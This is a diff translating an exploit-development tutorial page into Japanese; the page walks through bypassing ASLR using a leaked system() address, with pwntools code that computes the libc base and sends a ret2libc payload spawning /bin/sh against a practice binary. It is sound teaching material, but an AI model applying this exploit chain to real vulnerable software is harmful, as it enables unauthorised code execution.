@@ -1,6 +1,6 @@
-# ASLR Bypass with Given Leak
+# リークが与えられた場合の ASLR バイパス
 
-## The Source
+## ソース
 
 {% file src="../../../.gitbook/assets/aslr.zip" caption="ASLR - 32-bit" %}
 
@@ -27,24 +27,24 @@ void win() {
 }
 ```
 
-Just as we did for PIE, except this time we print the address of system.
+PIE のときと同じですが、今回は system のアドレスを出力します。
 
-## Analysis
+## 解析
 
 ```text
 $ ./vuln-32 
 System is at: 0xf7de5f00
 ```
 
-Yup, does what we expected.
+はい、期待どおりの動作です。
 
 {% hint style="info" %}
-Your address of system might end in different characters - you just have a different libc version
+system のアドレスは、末尾の文字が異なる場合があります。これは libc のバージョンが違うだけです。
 {% endhint %}
 
-## Exploitation
+## エクスプロイト
 
-Much of this is as we did with PIE.
+大部分は PIE のときと同じです。
 
 ```python
 from pwn import *
@@ -54,9 +54,9 @@ libc = elf.libc
 p = process()
 ```
 
-Note that we include the libc here - this is just another `ELF` object that makes our lives easier.
+ここで libc を読み込んでいる点に注目してください。これは単なるもうひとつの `ELF` オブジェクトで、作業を楽にしてくれます。
 
-Parse the address of system and calculate libc base from that \(as we did with PIE\):
+system のアドレスをパースし、そこから libc のベースを計算します(PIE のときと同様です)。
 
 ```python
 p.recvuntil('at: ')
@@ -66,7 +66,7 @@ libc.address = system_leak - libc.sym['system']
 log.success(f'LIBC base: {hex(libc.address)}')
 ```
 
-Now we can finally ret2libc, using the `libc` `ELF` object to really simplify it for us:
+これでようやく ret2libc ができます。`libc` の `ELF` オブジェクトを使えば、とても簡単に書けます。
 
 ```python
 payload = flat(
@@ -81,7 +81,7 @@ p.sendline(payload)
 p.interactive()
 ```
 
-### Final Exploit
+### 最終的なエクスプロイト
 
 ```python
 from pwn import *
@@ -108,15 +108,15 @@ p.sendline(payload)
 p.interactive()
 ```
 
-## 64-bit
+## 64 ビット
 
-Try it yourself :\)
+自分で試してみてください :)
 
 {% file src="../../../.gitbook/assets/aslr-64.zip" caption="ASLR - 64-bit" %}
 
-## Using pwntools
+## pwntools を使う
 
-If you prefer, you could have changed the following payload to be more pwntoolsy:
+お好みで、次のペイロードをもっと pwntools らしく書くこともできます。
 
 ```python
 payload = flat(
@@ -129,7 +129,7 @@ payload = flat(
 p.sendline(payload)
 ```
 
-Instead, you could do:
+代わりに、次のように書けます。
 
 ```python
 binsh = next(libc.search(b'/bin/sh'))
@@ -141,5 +141,5 @@ rop.system(binsh)
 p.sendline(rop.chain())
 ```
 
-The benefit of this is it's \(arguably\) more readable, but also makes it much easier to reuse in 64-bit exploits as all the parameters are automatically resolved for you.
+この書き方の利点は、(おそらく)読みやすいことに加えて、パラメータがすべて自動的に解決されるため、64 ビットのエクスプロイトでも再利用しやすいことです。
 
